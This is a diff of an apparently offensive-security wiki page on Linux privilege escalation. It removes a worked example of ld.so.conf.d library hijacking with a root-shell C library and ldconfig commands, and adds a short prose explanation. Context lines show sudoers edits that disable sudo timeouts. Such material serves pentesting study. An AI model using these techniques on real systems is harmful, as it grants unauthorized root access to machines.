@@ -873,38 +873,6 @@ echo "Defaults !tty_tickets" > /etc/sudoers.d/win
 echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
 
-### /etc/ld.so.conf.d/
-
-If you can create a file in `/etc/ld.so.conf.d/` and you can execute **`ldconfig`**with root privileges \(sudo or suid\) then you can **make executable load arbitrary libraries**. 
-
-For example, to make executables in that system load libraries from _/tmp_ you can **create** in that folder a **config file** \(_test.conf_\) pointing to _/tmp_:
-
-{% code title="/etc/ld.so.conf.d/test.conf" %}
-```bash
-/tmp
-```
-{% endcode %}
-
-And when executing **`ldconfig`**all the **binaries inside the system will be able to load libraries** from _/tmp_.  
-So if there is a **binary** that **executes** a function called **`seclogin()`** from a **library** called **`libseclogin.so`** , you can create a backdoor in _/tmp_ and impersonate that libraries with that function:
-
-{% code title="/tmp/libseclogin.so" %}
-```c
-#include <stdio.h>
-//To compile: gcc -fPIC -shared -o libseclogin.so exploit.c
-seclogin() {
-    setgid(0); setuid(0);
-    system("/bin/bash");
-}
-```
-{% endcode %}
-
-Note in the next image that \(_having already created the backdoor on /tmp_\) having the config file in _/etc/ld.so.conf.d_ pointing to _/tmp_ after using `ldconfig` the executable `myexec`stops loading the library from `/usr/lib` and loads it from _/tmp_:
-
-![](../../.gitbook/assets/image%20%28101%29.png)
-
-_This example was taken from the HTB machine: Dab._
-
 ### DOAS
 
 There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`
@@ -915,26 +883,18 @@ permit nopass demo as root cmd vim
 
 ## Shared Library
 
-#### ldconfig
+### ld.so
 
-Identify shared libraries with `ldd`
+The file `/etc/ld.so.conf` indicates **where are loaded the configurations files from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`
 
-```text
-$ ldd /opt/binary
-    linux-vdso.so.1 (0x00007ffe961cd000)
-    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
-    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
-```
+That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to another folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.
 
-Create a library in `/tmp` and activate the path.
+If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder indicated inside any config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.  
+Take a look about **how to exploit this misconfiguration** in the following page:
 
-```text
-gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
-echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
-/opt/binary
-```
+{% page-ref page="ld.so.conf-example.md" %}
 
-#### RPATH
+### RPATH
 
 ```text
 level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
